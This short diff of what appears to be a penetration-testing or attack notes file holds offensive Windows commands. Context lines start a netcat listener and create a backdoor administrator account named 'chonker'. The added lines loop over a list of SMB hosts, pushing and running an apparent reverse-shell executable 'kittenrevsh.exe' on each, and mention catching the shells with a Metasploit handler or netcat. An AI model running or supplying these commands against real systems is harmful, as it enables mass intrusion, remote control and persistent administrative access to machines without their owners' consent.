@@ -40,3 +40,8 @@ nc -nlvp 443
 #if shell pops, build new user asap and try privesc
 net user /add chonker 5150kitten
 net localgroup administrators chonker /add
+
+#Looper for the above
+cat ../../smb-hosts.txt | xargs -L 1 -I {} ./send_and_execute.py {} kittenrevsh.exe
+### This works with an msf multihandler, but nc -lvp 5150 and a quick ctrl-c will get a list built too
+
